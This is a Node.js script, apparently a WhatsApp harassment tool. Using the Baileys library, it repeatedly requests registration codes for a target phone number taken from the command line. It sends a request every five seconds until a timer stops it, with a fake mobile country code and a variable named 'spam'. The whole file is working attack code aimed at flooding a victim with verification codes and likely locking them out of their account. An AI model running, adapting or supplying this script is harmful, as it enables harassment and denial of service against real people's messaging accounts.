const gradient = require('gradient-string');
const pino = require('pino');
const { parsePhoneNumberFromString } = require('libphonenumber-js');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const phoneNumberInput = process.argv[2];
const duration = process.argv[3]
if (!phoneNumberInput) {
    console.error('Usage: node temp.js <phone_number>');
    process.exit(1);
}

const temporary = async (phoneNumberInput) => {
    try {
        const phoneNumberObj = parsePhoneNumberFromString(phoneNumberInput);
        if (!phoneNumberObj) {
            console.error('Invalid phone number format');
            process.exit(1);
        }

        const kodenegara = phoneNumberObj.countryCallingCode;
        const nomortarget = phoneNumberObj.nationalNumber;

        const start = async () => {
            const { state, saveCreds } = await useMultiFileAuthState('.mm');
            const spam = makeWaSocket({
                auth: state,
                mobile: true,
                logger: pino({ level: 'silent' })
            });

            const dropNumber = async (context) => {
                const { phoneNumber, ddi, number } = context;
           try {
                    const skids = await spam.requestRegistrationCode({
                            phoneNumber: '+' + phoneNumber,
                            phoneNumberCountryCode: ddi,
                            phoneNumberNationalNumber: number,
                            phoneNumberMobileCountryCode: 666
                    })
                    console.log(skids)
                    } catch (error) {
                        console.log(error)
                    }
            };

            console.log(`Sigma Skibidi Rizz? ${nomortarget}`);
            let ddi = `${kodenegara}`;
            let number = `${nomortarget}`;
            let phoneNumber = ddi + number;
            const sigma = { phoneNumber, ddi, number };
            setInterval(() => dropNumber(sigma), 5000)
        };

        start();
    } catch (e) {
        console.log(e);
    }
};
const killScript = () => process.exit(-1);
setTimeout(killScript, duration * 1000);

temporary(phoneNumberInput);
